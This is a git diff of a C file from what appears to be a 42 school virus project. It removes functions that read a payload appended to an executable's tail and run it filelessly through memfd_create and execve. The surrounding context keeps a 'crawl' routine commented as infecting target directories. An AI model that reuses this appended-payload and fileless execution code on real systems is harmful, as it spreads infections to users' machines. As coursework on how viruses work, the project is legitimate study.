@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/14 18:25:07 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/15 16:12:49 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,61 +40,6 @@ int	mute_outputs()
 	return (0);
 }
 
-t_footer	get_footer(const char *path)
-{
-	int	fd = open(path, O_RDONLY);
-
-	lseek(fd, -sizeof(t_footer), SEEK_END);
-
-	t_footer	footer;
-	read(fd, &footer, sizeof(footer));
-	close(fd);
-	return (footer);
-}
-
-int	extract_payload(const char *path, uint8_t **data, uint64_t *size)
-{
-	t_footer	footer = get_footer(path);
-
-	if (footer.magic != FOOTER_MAGIC)
-		return (-1);
-
-	int	fd = open(path, O_RDONLY);
-
-	*size = footer.payload_size;
-
-	lseek(fd, -(sizeof(t_footer) + *size), SEEK_END);
-
-	*data = malloc(*size);
-	read(fd, *data, *size);
-
-	close(fd);
-	return (0);
-}
-
-int	exec_payload(t_ctx *ctx, uint8_t *data, uint64_t size)
-{
-	int fd = syscall(SYS_memfd_create, "payload", 0);
-	write(fd, data, size);
-	free(data);
-
-	char path[256] = {0};
-	sprintf(path, "/proc/self/fd/%d", fd);
-
-	pid_t pid = fork();
-	if (pid == 0)
-	{
-		execve(path, ctx->av, ctx->envp);
-		exit(0);
-	}
-	else
-		wait(NULL);
-	return (0);
-}
-
-/*
-	Goes over all target directories and infects them
-*/
 int	crawl(t_ctx *ctx)
 {
 	const char	*TARGET_DIRS[] = {
